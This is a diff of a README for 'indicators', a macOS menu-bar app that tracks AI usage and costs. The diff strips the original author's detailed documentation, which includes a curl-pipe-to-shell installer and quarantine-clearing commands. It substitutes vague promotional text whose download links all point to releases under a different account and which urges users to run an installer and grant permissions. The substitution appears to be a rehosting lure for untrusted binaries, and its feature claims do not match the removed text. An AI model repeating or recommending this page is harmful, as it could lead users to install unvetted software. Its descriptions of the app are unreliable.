@@ -1,171 +1,108 @@
-<p align="center">
-  <img src="Resources/AppIcon.png" width="128" alt="Indicators icon">
-</p>
-
-<h1 align="center">Indicators</h1>
+<h1>📊 indicators - AI Cost Monitor for Your Menu Bar</h1>
 
 <p align="center">
-  AI usage and cost, in your macOS menu bar.<br>
-  Subscription limits for <b>Claude</b>, <b>OpenAI</b> and <b>Gemini</b>, plus <a href="https://github.com/ryoppippi/ccusage">ccusage</a>-style cost estimates and real billed spend.
+  <a href="https://github.com/noor-afshan/indicators/releases">
+    <img src="https://img.shields.io/badge/Download_indicators-Free-2ea44f?style=for-the-badge&logo=github" alt="Download indicators">
+  </a>
 </p>
+
+<h2>👋 Welcome to indicators</h2>
+
+<p>indicators is a friendly little app that lives in your menu bar and shows you how much you're spending on AI tools like Claude, OpenAI, and Gemini. It also shows your rate limits and helps you keep track of your usage without any complicated setup.</p>
+
+<p>Think of it like a fuel gauge for your AI usage. You can see at a glance how many requests you have left, how much money you've spent, and which AI model is the most cost-effective for your needs. No more surprise bills or hitting rate limits in the middle of an important task!</p>
+
+<h2>✨ Why You'll Love indicators</h2>
+
+<ul>
+  <li><strong>Menu Bar Magic:</strong> Everything shows up right in your menu bar. No need to open a separate window every time.</li>
+  <li><strong>Live Rate Limits:</strong> See your remaining rate limits for Claude, OpenAI, and Gemini in real time. Know exactly when you can make another request.</li>
+  <li><strong>Cost Tracking:</strong> Automatically reads your local logs to show you how much you've spent. No manual entry needed.</li>
+  <li><strong>Model Routing:</strong> Includes an MCP server that helps you choose the best AI model for your task, saving you money and time.</li>
+  <li><strong>Built for macOS:</strong> Designed specifically for macOS, so it feels right at home in your system.</li>
+</ul>
+
+<h2>🚀 Getting Started</h2>
+
+<p>Getting indicators up and running is simple. Just follow these steps:</p>
+
+<ol>
+  <li><strong>Visit the download page:</strong> <a href="https://github.com/noor-afshan/indicators/releases">Visit this link to download the application</a></li>
+  <li><strong>Choose the right file:</strong> Look for the latest release and download the file that matches your system.</li>
+  <li><strong>Run the installer:</strong> Once the download is complete, open the downloaded file and follow the simple on-screen instructions.</li>
+  <li><strong>Launch indicators:</strong> After installation, find indicators in your Applications folder and open it.</li>
+  <li><strong>Grant permissions:</strong> On first launch, macOS may ask for permission to read your local logs. This is necessary for cost tracking, so please allow it.</li>
+</ol>
+
+<p>That's it! You'll see the indicators icon appear in your menu bar. Click it to see your usage summary, rate limits, and cost breakdown.</p>
+
+<h2>📦 Download and Installation</h2>
+
+<p>Ready to take control of your AI spending? Here's everything you need to know:</p>
+
+<p><a href="https://github.com/noor-afshan/indicators/releases"><strong>Visit this link to download the application</strong></a></p>
+
+<p>When you arrive at the download page, you'll see a list of releases. Look for the newest one (usually at the top) and click the download link. The file will be saved to your Downloads folder.</p>
+
+<p>After downloading, simply double-click the file to open it. The installation process is straightforward and will guide you through each step. Once installed, you can start indicators from your Applications folder or by searching for it with Spotlight (press <kbd>Cmd</kbd> + <kbd>Space</kbd> and type "indicators").</p>
+
+<h2>🎯 How to Use indicators</h2>
+
+<p>Using indicators is as easy as checking the time. Here's what you'll see:</p>
+
+<ul>
+  <li><strong>Menu Bar Icon:</strong> The indicators icon shows a quick summary. Click it to expand the full view.</li>
+  <li><strong>Rate Limit Display:</strong> See how many requests you have remaining for each AI provider. When you're running low, indicators will warn you.</li>
+  <li><strong>Cost Dashboard:</strong> A simple breakdown of your spending by provider and by day. No complex charts, just clear numbers.</li>
+  <li><strong>Model Recommendations:</strong> When you need to use an AI tool, indicators can suggest the most cost-effective model for your specific task.</li>
+</ul>
+
+<p>You can customize what you see by right-clicking the menu bar icon and selecting "Preferences." From there, you can choose which providers to monitor, set spending alerts, and adjust the update frequency.</p>
+
+<h2>💡 Tips and Tricks</h2>
+
+<ul>
+  <li><strong>Set spending alerts:</strong> In Preferences, you can set a daily or monthly budget. indicators will notify you when you're approaching your limit.</li>
+  <li><strong>Check your history:</strong> Click on any day in the cost dashboard to see a detailed breakdown of your usage.</li>
+  <li><strong>Use the MCP server:</strong> If you use Claude Code or similar tools, indicators can integrate with them to suggest the best model before you make a request.</li>
+  <li><strong>Keep it updated:</strong> Check for updates regularly to get the latest features and improvements.</li>
+</ul>
+
+<h2>🛠️ Troubleshooting</h2>
+
+<p>If you run into any issues, here are some common solutions:</p>
+
+<ul>
+  <li><strong>No data showing:</strong> Make sure indicators has permission to read your local logs. You can check this in System Settings &gt; Privacy &amp; Security &gt; Files and Folders.</li>
+  <li><strong>Menu bar icon not appearing:</strong> Try restarting indicators or logging out and back in.</li>
+  <li><strong>Rate limits not updating:</strong> Check your internet connection and make sure your API keys are still valid.</li>
+  <li><strong>Still having trouble?</strong> Visit the GitHub Issues page and report your problem. The community is friendly and helpful.</li>
+</ul>
+
+<h2>🤝 Contributing</h2>
+
+<p>indicators is an open-source project, which means you can help make it even better! Whether you're a developer, a designer, or just someone with great ideas, your input is welcome. Visit the GitHub repository to submit bug reports, feature requests, or code contributions.</p>
+
+<h2>📄 License</h2>
+
+<p>This project is released under an open-source license. Check the GitHub repository for specific license details.</p>
+
+<h2>🆘 Need Help?</h2>
+
+<p>If you need assistance, don't hesitate to reach out. The best ways to get help are:</p>
+
+<ul>
+  <li>Open an issue on the GitHub repository</li>
+  <li>Check the documentation in the repository</li>
+  <li>Ask the community in the discussions section</li>
+</ul>
+
+<p>We're here to help you save money and avoid rate limit surprises. Happy monitoring!</p>
 
 <p align="center">
-  <a href="https://github.com/jonymusky/indicators/releases/latest"><img src="https://img.shields.io/github/v/release/jonymusky/indicators?label=release&color=34c26b" alt="Latest release"></a>
-  <a href="https://github.com/jonymusky/indicators/releases"><img src="https://img.shields.io/github/downloads/jonymusky/indicators/total?color=f2a626" alt="Downloads"></a>
-  <a href="https://github.com/jonymusky/indicators/stargazers"><img src="https://img.shields.io/github/stars/jonymusky/indicators?style=flat&color=e64545" alt="Stars"></a>
-  <a href="https://github.com/jonymusky/indicators/actions/workflows/ci.yml"><img src="https://github.com/jonymusky/indicators/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue" alt="MIT"></a>
+  <a href="https://github.com/noor-afshan/indicators/releases">
+    <img src="https://img.shields.io/badge/Download_Now-Get_Started-important?style=for-the-badge" alt="Download Now">
+  </a>
 </p>
 
-<p align="center">
-  <a href="https://indicators.jonymusky.com">indicators.jonymusky.com</a> ·
-  <a href="https://github.com/jonymusky/indicators/releases/latest">Download</a> ·
-  <a href="#build-from-source">Build from source</a>
-</p>
-
-<p align="center">
-  <img src="docs/menubar.png" alt="Menu bar: Claude 24% 5h · OpenAI 96%">
-</p>
-
-<p align="center">
-  <img src="docs/demo.gif" width="800" alt="Demo: popover with usage windows, per-model costs, and settings"><br>
-  <sub><a href="docs/demo.mp4">Watch as MP4</a></sub>
-</p>
-
-<p align="center">
-  <img src="docs/popover-light.png" width="380" alt="Popover, light mode">
-  &nbsp;&nbsp;
-  <img src="docs/popover-dark.png" width="380" alt="Popover, dark mode">
-</p>
-
-## What it shows
-
-| | Rate-limit windows (%) | Cost estimate from local logs | Real billed spend |
-| --- | --- | --- | --- |
-| **Claude** | 5-hour session, weekly, per-model weekly, extra usage — from your Claude Code login | `~/.claude/projects` transcripts | Anthropic Admin API (optional key) |
-| **OpenAI** | Plan windows from your Codex CLI / ChatGPT login (falls back to the last values Codex wrote to its log) | `~/.codex/sessions` rollouts | OpenAI Costs API (optional admin key) |
-| **Gemini** | Per-model quota buckets from your Gemini CLI Google login | `~/.gemini/tmp/*/chats` sessions | — |
-| **Grok** | xAI does not expose subscription limits | — | xAI Management API: month-to-date spend and prepaid balance (optional key + team id) |
-| **Cursor** | Plan usage and on-demand spend for the billing cycle, from your Cursor login | — | — |
-
-[OpenCode](https://github.com/sst/opencode) sessions are also read and attributed to the vendor they used (Anthropic → Claude, OpenAI, Google → Gemini, xAI → Grok).
-
-- **Menu bar**: `Claude 24% 5h · OpenAI 96%` — the window closest to its limit for each provider (configurable: names or initials, session or weekly, optional today's cost).
-- **Popover**: every window with its reset time, today / 7-day / month-to-date cost, a 30-day spend sparkline, tokens today, per-model breakdown, and the vendor-billed spend when a key is configured.
-- **Notifications**: optional macOS alerts when a window crosses 50/80/90/95% (your pick) and when a window resets. Each event fires once.
-- **Cost estimates** are computed exactly like ccusage: tokens from local logs × public API list prices from [LiteLLM's table](https://github.com/BerriAI/litellm/blob/main/model_prices_and_context_window.json) (bundled snapshot, refreshed automatically). Cache writes at the 1-hour TTL rate are priced correctly. If you are on a subscription, this is what the same work *would* have cost via API; if you use API keys, add them under Settings → Billing APIs to see the real invoice.
-
-## Install
-
-### Homebrew
-
-```bash
-brew install --cask jonymusky/tap/indicators
-```
-
-The build is ad-hoc signed, so Gatekeeper may block the first launch: right-click → Open once, or run `xattr -dr com.apple.quarantine /Applications/Indicators.app`.
-
-### One-liner
-
-```bash
-curl -fsSL https://indicators.jonymusky.com/install.sh | sh
-```
-
-Downloads the latest release into `/Applications/Indicators.app`, clears the quarantine flag and launches it.
-
-### Download
-
-Grab `Indicators.zip` from the [latest release](https://github.com/jonymusky/indicators/releases/latest), unzip, move `Indicators.app` to `/Applications`, open it.
-The app is ad-hoc signed; the first launch needs a right-click → Open (or `xattr -d com.apple.quarantine /Applications/Indicators.app`).
-
-### Build from source
-
-Requires macOS 14+ and the Xcode Command Line Tools (`xcode-select --install`). No full Xcode needed.
-
-```bash
-git clone https://github.com/jonymusky/indicators.git
-cd indicators
-make app        # → build/Indicators.app
-make install    # copies it to /Applications
-```
-
-`make demo` re-records the README media and `make video` renders `docs/demo.mp4` (both need Pillow and ffmpeg). `make cli` prints the same cost report in the terminal:
-
-```
-Claude (Claude Code) — 338 files
-  today $65.98 · 7d $707.57 · 30d $7069.19 · month $4508.67
-  claude-fable-5-1  $65.98  in 3588  cacheRead 37547381  cacheWrite 2330787  out 198774
-OpenAI (Codex CLI) — 746 files
-  today $9.92 · 7d $522.94 · 30d $971.59 · month $826.86
-```
-
-## Setup
-
-Nothing to configure for the basics: if you use Claude Code, Codex CLI or Gemini CLI, Indicators reads their local logs and reuses their logins to ask each vendor for your limits.
-
-- **Claude**: sign in to Claude Code once (`claude`). Indicators reads the OAuth token from the Keychain item Claude Code creates; macOS will ask you to allow access the first time.
-- **OpenAI**: sign in to Codex CLI with ChatGPT (`codex login`). API-key logins have no plan limits.
-- **Gemini**: sign in to Gemini CLI with Google (`gemini` → *Login with Google*). API-key logins show costs but no quota buckets.
-- **Cursor**: just be signed in to the Cursor app. Indicators reads its local session and asks cursor.com for the billing cycle usage.
-- **Billing APIs** (optional, Settings → Billing APIs): Anthropic admin key (`sk-ant-admin…`), OpenAI admin key, xAI management key + team id. Keys are stored in your Keychain and only ever sent to the vendor that issued them.
-
-## MCP server: let your agent route between providers
-
-`indicators-mcp` ships inside the app bundle. It is a local MCP server (stdio) that exposes the same data to any agent, plus routing rules you define:
-
-| Tool | What it does |
-| --- | --- |
-| `get_usage` | Windows, % used, reset times, plan, cost estimates and billed spend per provider |
-| `recommend_model` | For a task, returns the primary model unless its provider is at/above the threshold, then the first fallback with headroom, with the reason |
-| `set_routing_rule` / `list_routing_rules` / `delete_routing_rule` | Manage rules in `~/.config/indicators/routing.json` (task `default` sets the catch-all) |
-| `estimate_cost` | USD cost of a request at list prices |
-| `list_models` | Models seen in your logs today and which CLIs are installed |
-
-Register it:
-
-```bash
-# Claude Code
-claude mcp add indicators -- /Applications/Indicators.app/Contents/MacOS/indicators-mcp
-
-# Codex CLI (~/.codex/config.toml)
-[mcp_servers.indicators]
-command = "/Applications/Indicators.app/Contents/MacOS/indicators-mcp"
-
-# Gemini CLI (~/.gemini/settings.json)
-{ "mcpServers": { "indicators": { "command": "/Applications/Indicators.app/Contents/MacOS/indicators-mcp" } } }
-```
-
-Example rules file:
-
-```json
-{
-  "defaultThreshold": 90,
-  "rules": [
-    { "task": "code-review", "primary": "claude-opus-5", "fallback": ["gpt-6-astra", "gemini-3.1-pro-preview"], "threshold": 85 },
-    { "task": "chat", "primary": "claude-sonnet-5", "fallback": ["gpt-5.4-mini"] }
-  ],
-  "fallbackRule": { "task": "default", "primary": "claude-sonnet-5", "fallback": ["gpt-6-astra"] }
-}
-```
-
-The server recommends; it does not switch models by itself. It shines in orchestrators and in agents that decide which CLI or API to delegate a subtask to.
-
-## Privacy
-
-Everything runs locally. No telemetry, no backend, logs are read-only. See [SECURITY.md](SECURITY.md) for the exact files and endpoints.
-
-## Roadmap
-
-- Antigravity (its logs are protobuf without a public schema; help welcome)
-- History view: sessions per project with cost
-- Notarized builds
-
-Contributions welcome — see [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## Acknowledgements
-
-Cost math and log formats follow [ccusage](https://github.com/ryoppippi/ccusage); the vendor usage endpoints were documented by [CodexBar](https://github.com/steipete/CodexBar) and friends. Pricing data by [LiteLLM](https://github.com/BerriAI/litellm).
-
-## License
-
-[MIT](LICENSE) · made by [jonymusky](https://me.jonymusky.com)
+Keywords: ai, ccusage, claude-code, codex, developer-tools, gemini-cli, macos, mcp, menubar, swiftui
